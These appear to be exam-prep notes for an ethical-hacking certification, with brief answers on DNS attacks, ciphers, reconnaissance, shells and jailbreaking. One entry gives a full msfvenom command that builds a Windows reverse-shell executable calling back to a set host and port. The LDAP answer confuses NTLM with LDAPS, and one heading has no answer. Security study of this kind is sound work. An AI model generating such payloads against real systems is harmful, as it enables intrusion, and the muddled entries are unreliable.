## First Step of DNS Cache Poisoning
Querying a nameserver is the first move to gather DNS information.

---

## Five-Tier Container Technology Architecture


---

## Protocol to Secure LDAP
Use **NTLM** (with a port, usually TCP 389/636 if encrypted), but **LDAPS (LDAP over SSL)** is more typical.

---

## LTE Attack Type
The attacker installing a fake tower is called an **aLTEr attack**.

---

## Symmetric Cipher with 128-bit Block and 256-bit Key
**Twofish** supports 128-bit block size and up to 256-bit key size.

---

## Block Size vs Key Size
- **Block Size:** Fixed chunk of data processed (e.g., 128 bits at a time).
- **Key Size:** Length of encryption key (affects security strength).

---

## Solving Plaintext Transmission
Switch to **HTTPS** (HTTP over SSL/TLS) to encrypt usernames/passwords.

---

## OS Detection with TTL Value
TTL of **128** usually indicates a **Windows** operating system.

---

## Whois + IP Info Retrieval
The hacker used **ARIN** to retrieve network range and topology data.

---

## Google Advanced Operator for Domain-Restricted Search
Use **`site:`** operator (e.g., `site:example.com`).

---

## Security Policy for Dial-out Modems
Check the **Remote-access policy** to verify permissions.

---

## Correct msfvenom Reverse Shell Command
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe
```

---

## Reverse Shell vs Bind Shell
- **Reverse Shell:** Attacker connects back (firewall friendly).
- **Bind Shell:** Attacker connects directly (requires open port).

---

## Reverse or Bind - Which Is Mostly Used?
**Reverse Shell** is mostly used because it's firewall/NAT-friendly.

---

## Bank URL Redirection Attack
The scenario describes a **DNS Hijacking** attack.

---

## CVSS v3.0 Basic Score 4.0
Severity Level: **Medium**.

---

## Difference: Pharming vs Phishing
- **Phishing:** Fake link via email/social engineering.
- **Pharming:** Redirecting by modifying DNS/hosts file.

---

## Virus Detection via Virtual Execution
**Code Emulation** is used to detect viruses by simulating them in a VM.

---

## Bluetooth Hacking: Theft of Information
**Bluesnarfing** involves stealing information via Bluetooth.

---

## Cyber Kill Chain Stage: Preparing Payload
John is at the **Weaponization** stage.

---

## SQLi Type using DNS Requests
**Out-of-band SQLi** leverages DNS to pass data to attackers.

---

## Firewall Evasion Scanning with Zombie
Technique is **Idle Scanning** (uses low-activity systems).

---

## Ping Command Flag Hidden Under "*"
The hidden flag is **`-n`** (Windows style for specifying number of Echo Requests).

---

## Cloud Attack on MSPs
Attack type is a **Cloud Hopper Attack**.

---

## IDS Evasion with Unicode Packets
Technique used: **Obfuscating**.

---

## iOS Jailbreaking Technique with Boot Patch
**Untethered Jailbreaking** â€” remains jailbroken after reboot without computer connection.

---

## iOS Jailbreaking Techniques Overview
- **Tethered:** Needs PC every reboot.
- **Semi-tethered:** Boots but no jailbreak functionality until PC reconnection.
- **Semi-untethered:** Boots normally; re-run app to jailbreak without PC.
- **Untethered:** Fully jailbroken even after reboot (no PC needed).

---

## DNS Tunneling Tool NSTX Port
Run NSTX over **Port 53** (standard DNS port).
